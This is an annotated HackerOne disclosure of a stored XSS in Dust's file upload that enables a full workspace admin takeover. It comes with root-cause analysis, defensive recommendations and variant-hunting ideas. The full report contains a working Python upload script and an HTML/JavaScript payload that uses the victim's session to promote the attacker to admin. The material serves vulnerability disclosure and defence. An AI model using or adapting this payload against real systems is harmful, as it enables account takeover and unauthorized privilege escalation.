# Stored XSS in File Upload Leads to Privilege Escalation and Full Workspace Takeover

## Metadata
- **Source:** HackerOne
- **Report:** 3115705 | https://hackerone.com/reports/3115705
- **Submitted:** 2025-04-28
- **Reporter:** sjalu
- **Program:** Dust (dust.tt)
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** Stored Cross-Site Scripting (XSS), Privilege Escalation, Broken Access Control, Inadequate Input Validation, Insufficient Content-Type Validation
- **CVEs:** None
- **Category:** web-api

## Summary
A stored XSS vulnerability in Dust's file upload functionality allows attackers to upload malicious HTML files that execute JavaScript in the authenticated sessions of workspace members who view them. By exploiting this, an attacker can issue authenticated API requests to promote themselves to admin, demote legitimate admins, access secrets, and achieve full workspace compromise.

## Attack scenario
1. Attacker creates a low-privilege account in target workspace and obtains session cookie
2. Attacker uploads malicious HTML file disguised as image (xss_poc.png) via file upload API, setting contentType to text/html
3. Attacker shares the downloadUrl parameter with workspace admin or obtains admin access to trigger viewing
4. When admin visits the malicious file URL with ?action=view parameter, stored JavaScript executes in admin's authenticated browser session
5. JavaScript payload fetches user data to identify workspace ID and victim user ID, then issues authenticated POST request to promote attacker account to admin role
6. Attacker now has full admin privileges and can delete admins, access secrets, and completely compromise the workspace

## Root cause
The application fails to properly validate and sanitize uploaded file content. The vulnerability stems from multiple control failures: (1) contentType header is not validated server-side, allowing HTML upload despite image filename, (2) uploaded HTML files are served with insufficient Content-Security-Policy or X-Content-Type-Options headers, (3) the ?action=view parameter renders user-uploaded content in the browser context without sandboxing, (4) no CSRF tokens or additional authentication required for sensitive API operations like role changes.

## Attacker mindset
An insider threat or compromised low-privilege account holder seeks to escalate privileges and achieve full workspace control. The attacker recognizes that file upload endpoints often have weaker validation than other inputs, and that admin users are likely to click on workspace-shared files. By combining stored XSS with the application's trust in authenticated sessions, the attacker can weaponize the admin's own credentials to promote themselves, effectively hijacking the entire workspace without requiring the admin's explicit interaction beyond visiting a link.

## Defensive takeaways
- Implement strict Content-Type validation server-side, not relying on client headers; whitelist allowed MIME types and verify file content matches declared type using magic bytes
- Serve user-uploaded files with restrictive HTTP headers: Content-Security-Policy: default-src 'none', X-Content-Type-Options: nosniff, and Content-Disposition: attachment
- Sandbox user-generated content in separate origin/subdomain to prevent XSS from accessing authenticated API cookies
- Implement CSRF tokens for all state-changing operations (role changes, secret access) and verify token freshness
- Require additional authentication or multi-factor confirmation for sensitive operations like privilege escalation
- Apply Content Security Policy at application level to prevent inline script execution
- Implement file type validation using both extension and content analysis; consider serving uploads through a proxy that re-validates content
- Log and alert on suspicious API patterns, especially role changes or bulk member modifications
- Conduct security review of file handling: render as attachment, not inline; use sandboxed viewers for previews
- Implement rate limiting on sensitive API endpoints to detect automated exploitation attempts

## Variant hunting
Check other file upload endpoints (profile pictures, workspace documents, settings) for similar stored XSS via HTML/SVG/XML uploads
Test whether other content types bypass validation: .svg with embedded scripts, .pdf with JavaScript, .xml with XXE payloads
Examine API endpoints that generate downloadUrl parameters—verify all handle ?action=view securely
Hunt for CSRF vulnerabilities in other sensitive operations beyond role changes (secret deletion, member removal, workspace settings)
Test whether file preview/thumbnail generation exposes XSS through unsafe rendering
Investigate if authenticated session cookies lack HttpOnly flag, allowing JavaScript access
Check if similar privilege escalation APIs exist without proper authorization checks
Test file uploads in other collaboration features (direct messages, shared documents) for XSS storage
Verify whether workspace invitation links or share links have similar XSS vulnerabilities
Hunt for open redirect or SSRF in file download functionality that could chain with authentication bypass

## MITRE ATT&CK
- T1190
- T1434
- T1598
- T1566
- T1204
- T1550
- T1098
- T1136
- T1531
- T1021

## Notes
This is a critical vulnerability combining multiple security failures: weak input validation, insufficient output encoding, missing CSRF protection, and session hijacking. The ability to upload HTML with image filenames suggests the backend validates only the declared contentType header rather than actual file content. The fact that accessing ?action=view renders HTML inline without sandboxing is a critical architectural flaw. The privilege escalation API appears to lack proper authorization verification, trusting only authenticated session status. This report demonstrates why file upload functionality requires defense-in-depth: validation at multiple layers, restrictive serving headers, content sandboxing, and CSRF/authentication checks on all sensitive operations.

## Full report
<details><summary>Expand</summary>

## Summary:
A stored cross-site scripting (XSS) vulnerability was discovered in the Dust platform’s file upload functionality.

An attacker can upload a malicious HTML file to a conversation. When another user, including an admin, visits the uploaded file, JavaScript is executed in their authenticated browser session.

This allows an attacker to issue authenticated API requests on behalf of the victim, including:
	•	Promoting their own account to Admin
	•	Downgrading or removing legitimate admins
	•	Accessing and deleting secrets
	•	Full control over the workspace

The attack requires the victim to be a member of the same workspace and visit the malicious file URL. Once triggered, the attacker can fully compromise the workspace.

## Steps To Reproduce:

  1. Set up a workspace where you are admin.
 2. Invite a dummy account with the normal member role.
  3. Upload the malicious file on the dummy account using the Python script below. Use the HTML found at the bottom for upload.
```python
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

cookies = {
    'appSession': '<dummy_account_session>',
}

json_data = {
    'contentType': 'text/html',
    'fileName': 'xss_poc.png',
    'fileSize': 7331,
    'useCase': 'conversation'
}

response = requests.post('https://dust.tt/api/w/<workspace_sid>/files', cookies=cookies, json=json_data)
print(response.text)

uploadUrl = response.json()['file']['uploadUrl']

cookies = {
    'appSession': '<dummy_account_session>',
}

m = MultipartEncoder(
    fields={
        'file': (
            'xss_poc.png',  # Filename
            open('Dust/xss.html', 'rb'),  # File object
            'text/html'  # Content-Type
        )
    }
)

headers = {
    'accept': '*/*',
    'accept-language': 'nb-NO,nb;q=0.9,no;q=0.8,nn;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': m.content_type,  # This will correctly set boundary
    'origin': 'https://dust.tt',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://dust.tt/w/<workspace_sid>/assistant/new',
    'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"macOS"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
}

# Make the request
response = requests.post(
    url=uploadUrl,
    headers=headers,
    cookies=cookies,
    data=m  
)

print(f'[*] URL TO SHARE:\n{response.json()["file"]["downloadUrl"]}?action=view')
```
  4. Share the URL with the workspace admin account.
 5. When the victim visits the link, your script runs automatically, promoting the dummy account to Admin. 

HTML File:
```html
<html>
<head>
  <title>PoC - Dust Workspace Takeover</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 40px;
      background-color: #f8f9fa;
    }
    .container {
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
    }
    h1 {
      color: #333;
    }
    p {
      color: #555;
    }
  </style>
</head>

<body>
  <div class="container">
    <h1>Proof of Concept - Dust Workspace Admin Takeover</h1>
    <p>When this page is visited by an admin inside a workspace, he'll give the attacker's user ID admin privileges. The attacker can then manually de-rank the former admin to a regualar member.</p>
  </div>

<script>
// Your user ID here (dummy account's ID)
const attackerUserId = '<dummy_id>'; // <-- replace with dummy account ID!

fetch('https://dust.tt/api/user', {
    method: 'GET',
    headers: {
        'accept': '*/*',
        'x-commit-hash': '41c0391',
    },
    credentials: 'include'
})
.then(res => res.json())
.then(userData => {
    if (userData.user && userData.user.workspaces && userData.user.workspaces.length > 0) {
        const workspaceId = userData.user.workspaces[0].sId; // Get workspace ID
        const victimUserId = userData.user.id; // Victim's own ID

        // 1. Promote attacker to admin
        fetch(`https://dust.tt/api/w/${workspaceId}/members/${attackerUserId}`, {
            method: 'POST',
            headers: {
                'content-type': 'application/json',
                'accept': '*/*',
                'x-commit-hash': '41c0391',
            },
            credentials: 'include',
            body: JSON.stringify({
                role: "admin"
            })
        });

        alert(`PWNED\n\nVictim Username: ${userData.user.username}\nVictim Email: ${userData.user.email}`);
    }
});
</script>
</body>
</html>
```

## Impact

This vulnerability allows an attacker to execute arbitrary JavaScript in the browser of any user within the same workspace who visits a malicious link. Through this, the attacker can perform any actions on behalf of the victim user, leveraging their active session without needing to steal or view the session cookie itself. An attacker view  (only key, not value - value is hidden for everyone) and delete private secrets, access internal data, modify settings, and if the victim has administrative privileges, escalate their own account to an admin role and revoke admin rights from others. This results in a full compromise of the user account, potential privilege escalation, and takeover of the entire workspace. The overall security impact is critical.

</details>

---
*Analysed by Claude on 2026-05-12*
